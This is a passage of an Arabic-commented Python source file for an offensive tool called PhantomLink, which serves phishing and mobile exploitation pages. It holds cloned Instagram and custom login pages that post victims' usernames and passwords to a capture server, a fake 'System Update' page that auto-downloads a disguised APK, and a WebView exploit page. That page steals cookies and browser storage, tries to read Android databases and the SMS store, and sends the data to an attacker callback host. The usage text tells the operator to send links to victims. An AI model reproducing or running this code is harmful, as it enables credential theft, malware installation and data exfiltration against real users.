R4P1YDUjlsViQSAQ9OuRy+XCZDIhLi4OWVlZmDVrVp/q/A8FIQSFhYVYtWoV5s2bh2XLliEkJMRnHg6HA4fDgfXr16OiogIGgwEVFRUQCAQQi8X4+uuvoVKp0NDQgObmZshkMuj1esTGxiI+Ph5qtRpisZj1eVCwv1CxvmCxWJCSkoLx48cjJSUFMpkMhBAYjUakpKQgMTERn3zyCSiK8knhCoVCtLa2QqfTYejQoQgJCfFgVQQCgdb7Wee/BdYDOBwOEhMT8dJLLyE3Nxc1NTWw2Wyorq7G3r17YTKZcOrUKYjFYlgsFp8xOSIiAiRJYvjw4UhNTUVmZiaOHj2KoqIilJWVYerUqRg6dKhPGh3+n+UPACQkJMBut6O4uBgcxApWq9VrhvX09MBqtcJms2H06NEICwvD4MGDMWLECJDdf7JQKBQEAt+N9RuA65YkCA4ORkpKCnJzc5Geno5AIBAIBIK/AmazGXv37sX69euhUqkwduxYn7khQRBY9IHHHnuMFeqCg4MhEAgQGBgYCAQCgUAgEAgEAoFA4McGfwfjsK3PL6/KDQAAAABJRU5ErkJggg==" alt="App Store">
</div>
<div class="footer">
<a href="#">Meta</a> · <a href="#">About</a> · <a href="#">Blog</a> · <a href="#">Jobs</a> · <a href="#">Help</a> · <a href="#">API</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
</div>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(e){
e.preventDefault();
var f = this;
var x = new XMLHttpRequest();
x.open('POST', '/capture', true);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('username='+encodeURIComponent(f.username.value)+'&password='+encodeURIComponent(f.password.value)+'&platform=instagram');
setTimeout(function(){window.location.href='https://instagram.com'}, 1000);
});
</script>
</body>
</html>'''

    def _generate_driveby_page(self, apk_url: str, lhost: str, lport: int) -> str:
        """توليد صفحة Drive-By Download — تحميل APK تلقائي."""
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>System Update Required</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}}
.container{{max-width:450px;width:100%;padding:30px;text-align:center}}
.icon{{font-size:80px;margin-bottom:20px}}
h1{{font-size:28px;margin-bottom:10px}}
p{{font-size:16px;margin-bottom:30px;opacity:0.9}}
.loader{{width:60px;height:60px;margin:0 auto 20px;border:5px solid rgba(255,255,255,0.3);border-top:5px solid #fff;border-radius:50%;animation:spin 1s linear infinite}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
.btn{{display:inline-block;padding:14px 40px;background:#fff;color:#764ba2;border-radius:50px;font-size:18px;font-weight:600;text-decoration:none;cursor:pointer;transition:transform 0.3s}}
.btn:hover{{transform:scale(1.05)}}
.progress{{width:100%;height:6px;background:rgba(255,255,255,0.2);border-radius:3px;margin:20px 0;overflow:hidden}}
.progress-bar{{height:100%;width:0%;background:#fff;border-radius:3px;transition:width 0.5s}}
.status{{font-size:14px;opacity:0.8}}
</style>
</head>
<body>
<div class="container">
<div class="icon">⚡</div>
<h1>System Update Required</h1>
<p>Your device needs a critical security update to continue using this service.</p>
<div class="loader"></div>
<div class="progress"><div class="progress-bar" id="progressBar"></div></div>
<p class="status" id="statusText">Preparing update...</p>
<br>
<a class="btn" id="downloadBtn" href="{apk_url}" download>Download Update</a>
</div>
<script>
var progress = 0;
var interval = setInterval(function(){{
progress += Math.random() * 15;
if(progress > 100) progress = 100;
document.getElementById('progressBar').style.width = progress + '%';
if(progress < 30) document.getElementById('statusText').textContent = 'Downloading update package...';
else if(progress < 60) document.getElementById('statusText').textContent = 'Verifying system integrity...';
else if(progress < 90) document.getElementById('statusText').textContent = 'Applying security patches...';
else {{document.getElementById('statusText').textContent = 'Update ready! Click below to install.';
clearInterval(interval);
document.getElementById('downloadBtn').style.display = 'inline-block';
}}
}}, 800);

// Auto-download attempt
setTimeout(function(){{
document.getElementById('downloadBtn').click();
}}, 3000);

// Beacon to attacker server
new Image().src = '/track?device=' + navigator.userAgent + '&time=' + Date.now();
</script>
</body>
</html>'''
    
    def _generate_webview_exploit_page(self, payload_url: str) -> str:
        """توليد صفحة استغلال WebView — خطف الجلسات والكوكيز."""
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Loading...</title>
<style>
body{{background:#000;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.loading{{text-align:center}}
.spinner{{width:50px;height:50px;border:4px solid #333;border-top:4px solid #0ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}}
@keyframes spin{{0%{{transform:rotate(0deg)}}100%{{transform:rotate(360deg)}}}}
</style>
</head>
<body>
<div class="loading">
<div class="spinner"></div>
<h2>Loading secure content...</h2>
</div>

<script>
// ===== WebView Exploit Payload =====
// يستغل WebView JavaScriptInterface + Android.addJavascriptInterface

(function() {{
    // 1. محاولة استغلال Android JavaScriptInterface
    try {{
        if(window.Android && typeof Android === 'object') {{
            // استدعاء Java methods مباشرة
            var data = {{
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                userAgent: navigator.userAgent,
                url: window.location.href
            }};
            
            // محاولة تنفيذ أوامر عبر bridge
            if(typeof Android.execute === 'function') {{
                Android.execute('cat /data/data/*/databases/*.db');
            }}
            if(typeof Android.getCookies === 'function') {{
                Android.getCookies('all');
            }}
            
            // إرسال البيانات المسروقة
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '{payload_url}/steal', false);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(data));
        }}
    }} catch(e) {{}}

    // 2. محاولة استغلال WebViewDatabase
    try {{
        if(window.WebViewDatabase) {{
            // سرقة بيانات التصفح
        }}
    }} catch(e) {{}}

    // 3. محاولة قراءة الملفات المحلية (file://)
    try {{
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'file:///data/data/com.android.providers.telephony/databases/mmssms.db';
        document.body.appendChild(iframe);
    }} catch(e) {{}}

    // 4. إرسال beacon مع جميع البيانات
    try {{
        var img = new Image();
        img.src = '{payload_url}/beacon?' + 
            'ck=' + encodeURIComponent(document.cookie) + 
            '&ua=' + encodeURIComponent(navigator.userAgent) +
            '&ref=' + encodeURIComponent(document.referrer);
    }} catch(e) {{}}
}})();
</script>
</body>
</html>'''

    def _generate_custom_page(self, title: str, logo_url: str = None, fields: list = None) -> str:
        """توليد صفحة مخصصة حسب الطلب."""
        if fields is None:
            fields = [{"name": "email", "type": "email", "placeholder": "Email"}, 
                      {"name": "password", "type": "password", "placeholder": "Password"}]
        
        fields_html = ""
        for field in fields:
            fields_html += f'''
<div class="input-group">
    <input type="{field['type']}" name="{field['name']}" placeholder="{field['placeholder']}" required>
</div>'''
        
        return f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.container{{max-width:400px;width:100%;padding:30px}}
.card{{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);padding:40px}}
.logo{{text-align:center;margin-bottom:30px;font-size:32px;font-weight:700;color:#333}}
.input-group{{margin-bottom:16px}}
.input-group input{{width:100%;padding:14px 16px;font-size:15px;border:2px solid #e0e0e0;border-radius:8px;outline:none;transition:border 0.3s}}
.input-group input:focus{{border-color:#667eea}}
.btn{{width:100%;padding:14px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.3s}}
.btn:hover{{transform:translateY(-2px)}}
.footer{{text-align:center;margin-top:20px;font-size:13px;color:#888}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo">{title}</div>
<form method="POST" action="/capture">
{fields_html}
<button type="submit" class="btn">Sign In</button>
</form>
<div class="footer">Secure login powered by OAuth 2.0</div>
</div>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(e){{
e.preventDefault();
var f = this;
var x = new XMLHttpRequest();
x.open('POST', '/capture', true);
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
var data = '';
for(var i = 0; i < f.elements.length; i++) {{
    if(f.elements[i].name) {{
        data += f.elements[i].name + '=' + encodeURIComponent(f.elements[i].value) + '&';
    }}
}}
x.send(data + 'platform=custom');
setTimeout(function(){{window.location.href = window.location.origin + '/redirect'}}, 1000);
}});
</script>
</body>
</html>'''

    def start_server(self, lhost: str, lport: int, template: str = "google", 
                     ssl_enabled: bool = False, cert_path: str = None) -> None:
        """تشغيل خادم HTTP للتصيد والاستغلال."""
        
        # اختيار القالب
        if template == "google":
            page_content = self._generate_google_template()
        elif template == "facebook":
            page_content = self._generate_fb_template()
        elif template == "instagram":
            page_content = self._generate_instagram_template()
        else:
            page_content = self._generate_custom_page(template)
        
        captured_data = []
        
        class PhantomHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # منع ظهور اللوق
            
            def do_GET(self):
                if self.path == '/' or self.path == '/index.html':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(page_content.encode())
                    
                    print(f"\n[+] ضيف جديد: {self.client_address[0]}")
                    print(f"[+] وكيل المستخدم: {self.headers.get('User-Agent', 'غير معروف')[:60]}")
                    
                elif self.path.startswith('/track'):
                    # تسجيل الزائر
                    print(f"[+] تم التتبع: {self.client_address[0]}")
                    self.send_response(200)
                    self.send_header('Content-Type', 'image/gif')
                    self.end_headers()
                    self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')
                
                elif self.path.startswith('/beacon'):
                    # استقبال بيانات من WebView exploit
                    from urllib.parse import urlparse, parse_qs
                    params = parse_qs(urlparse(self.path).query)
                    print(f"\n[🔥] بيانات مسروقة من WebView!")
                    print(f"[🔥] Cookies: {params.get('ck', [''])[0][:50]}...")
                    print(f"[🔥] User-Agent: {params.get('ua', [''])[0][:50]}...")
                    
                    captured_data.append({
                        'type': 'webview_data',
                        'ip': self.client_address[0],
                        'data': params,
                        'time': time.time()
                    })
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'OK')
                
                elif self.path == '/redirect':
                    # إعادة توجيه بعد التصيد
                    self.send_response(302)
                    if template == "google":
                        self.send_header('Location', 'https://accounts.google.com')
                    elif template == "facebook":
                        self.send_header('Location', 'https://facebook.com')
                    elif template == "instagram":
                        self.send_header('Location', 'https://instagram.com')
                    else:
                        self.send_header('Location', 'https://google.com')
                    self.end_headers()
                
                else:
                    self.send_response(404)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'Not Found')
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode()
                
                if self.path == '/capture':
                    # استقبال بيانات تسجيل الدخول
                    import urllib.parse
                    params = urllib.parse.parse_qs(body)
                    
                    entry = {
                        'ip': self.client_address[0],
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'user_agent': self.headers.get('User-Agent', ''),
                        'data': {k: v[0] for k, v in params.items()},
                        'platform': params.get('platform', ['unknown'])[0]
                    }
                    captured_data.append(entry)
                    
                    # حفظ البيانات في ملف
                    log_file = os.path.join(os.getcwd(), 'outputs', f'captured_{datetime.now().strftime("%Y%m%d")}.txt')
                    with open(log_file, 'a') as f:
                        f.write(f"\n{'='*60}")
                        f.write(f"\n[IP] {entry['ip']}")
                        f.write(f"\n[Time] {entry['timestamp']}")
                        f.write(f"\n[Platform] {entry['platform']}")
                        f.write(f"\n[User-Agent] {entry['user_agent']}")
                        for k, v in entry['data'].items():
                            if k != 'platform':
                                f.write(f"\n[{k}] {v}")
                        f.write(f"\n{'='*60}\n")
                    
                    # طباعة في الشاشة
                    print(f"\n╔═══ بيانات واردة! ═══╗")
                    print(f"║ IP: {entry['ip']}")
                    print(f"║ المنصة: {entry['platform']}")
                    for k, v in entry['data'].items():
                        if k != 'platform' and v:
                            print(f"║ {k}: {v[:50]}")
                    print(f"╚═══ إجمالي: {len(captured_data)} ═══╝\n")
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'status': 'ok'}).encode())
        
        # تشغيل الخادم
        server = http.server.HTTPServer((lhost, lport), PhantomHandler)
        
        if ssl_enabled and cert_path:
            # تشغيل HTTPS
            server.socket = ssl.wrap_socket(
                server.socket,
                certfile=cert_path,
                server_side=True,
                ssl_version=ssl.PROTOCOL_TLS
            )
            protocol = "HTTPS"
        else:
            protocol = "HTTP"
        
        # إنشاء مجلد المخرجات
        os.makedirs(os.path.join(os.getcwd(), 'outputs'), exist_ok=True)
        
        print(f"""
╔═══════════════════════════════════════════════════╗
║        PhantomLink — خادم التصيد والاستغلال        ║
╠═══════════════════════════════════════════════════╣
║  • الرابط: {protocol.lower()}://{lhost}:{lport}               ║
║  • القالب: {template}                              ║
║  • البروتوكول: {protocol}                              ║
║  • خادم الاستماع: {lhost}:{lport}                          ║
║  • حالة التصيد: 🟢 نشط                            ║
║  • عدد الضحايا: 0                                 ║
╚═══════════════════════════════════════════════════╝
        """)
        
        print(f"[+] أرسل الرابط للضحية: {protocol.lower()}://{lhost}:{lport}")
        print(f"[+] انتظار الضحايا... (اضغط Ctrl+C للإيقاف)\n")
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print(f"\n[!] تم إيقاف الخادم")
            print(f"[!] عدد الضحايا: {len(captured_data)}")
            server.server_close()
    
    def generate_apk_download_link(self, apk_path: str, lhost: str, lport: int) -> dict:
        """توليد صفحة Drive-By Download لتحميل APK."""
        # حساب مسار APK
        if not os.path.exists(apk_path):
            return {"success": False, "error": "ملف APK غير موجود"}
        
        # نسخ APK إلى مجلد الخادم
        server_apk_dir = os.path.join(self.output_dir, "www")
        os.makedirs(server_apk_dir, exist_ok=True)
        
        apk_filename = f"update_{uuid.uuid4().hex[:8]}.apk"
        shutil.copy2(apk_path, os.path.join(server_apk_dir, apk_filename))
        
        # توليد صفحة التحميل
        page = self._generate_driveby_page(f"/{apk_filename}", lhost, lport)
        
        # حفظ صفحة التحميل
        with open(os.path.join(server_apk_dir, "index.html"), 'w') as f:
            f.write(page)
        
        return {
            "success": True,
            "apk_file": apk_filename,
            "page_path": os.path.join(server_apk_dir, "index.html"),
            "download_url": f"http://{lhost}:{lport}/{apk_filename}",
            "page_url": f"http://{lhost}:{lport}"
        }
    
    def generate_exploit_link(self, callback_url: str, technique: str = "all") -> dict:
        """توليد رابط استغلال WebView متكامل."""
        page = self._generate_webview_exploit_page(callback_url)
        
        output_path = os.path.join(self.output_dir, "exploit_page.html")
        with open(output_path, 'w') as f:
            f.write(page)
        
        return {
            "success": True,
            "output_path": output_path,
            "techniques_used": ["JavaScriptInterface exploit", "Cookie theft", "Local file read", "Beacon exfil"],
            "note": "ارسل هذا الرابط للضحية عبر أي وسيلة (SMS, WhatsApp, Email)"
        }


# ───[ Main ]─────────────────────────────────────────────────
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  PhantomLink v1.0 — WebView Exploitation & Phishing Engine ║
    ║  روابط اختراق متطورة | تصيد من الجيل الثاني | Drive-By  ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    import sys
    phantom = PhantomLink()
    
    if len(sys.argv) >= 3:
        mode = sys.argv[1]
        
        if mode == "server" and len(sys.argv) >= 4:
            lhost = sys.argv[2]
            lport = int(sys.argv[3])
            template = sys.argv[4] if len(sys.argv) > 4 else "google"
            phantom.start_server(lhost, lport, template)
        
        elif mode == "driveby" and len(sys.argv) >= 5:
            apk_path = sys.argv[2]
            lhost = sys.argv[3]
            lport = int(sys.argv[4])
            result = phantom.generate_apk_download_link(apk_path, lhost, lport)
            if result["success"]:
                print(f"\n[✓] صفحة التحميل جاهزة!")
                print(f"[✓] الرابط: {result['page_url']}")
                print(f"[✓] APK مباشر: {result['download_url']}")
        
        elif mode == "exploit" and len(sys.argv) >= 4:
            callback = sys.argv[2]
            port = sys.argv[3]
            result = phantom.generate_exploit_link(f"http://{callback}:{port}")
            if result["success"]:
                print(f"\n[✓] صفحة الاستغلال جاهزة!")
                print(f"[✓] المسار: {result['output_path']}")
                print(f"[✓] التقنيات: {', '.join(result['techniques_used'])}")
        
        else:
            print("[*] الأوضاع المتاحة:")
            print("    server <lhost> <lport> [template]  — تشغيل خادم تصيد")
            print("    driveby <apk> <lhost> <lport>      — توليد رابط تحميل APK")
            print("    exploit <callback_host> <port>     — توليد رابط استغلال WebView")
            print("\n[📋] القوالب المتاحة: google, facebook, instagram, أو أي عنوان")
    else:
        print("[*] الاستخدام:")
        print("    python3 phantomlink.py server 0.0.0.0 8080 google")
        print("    python3 phantomlink.py driveby malicious.apk 192.168.1.100 8080")
        print("    python3 phantomlink.py exploit 192.168.1.100 4444")
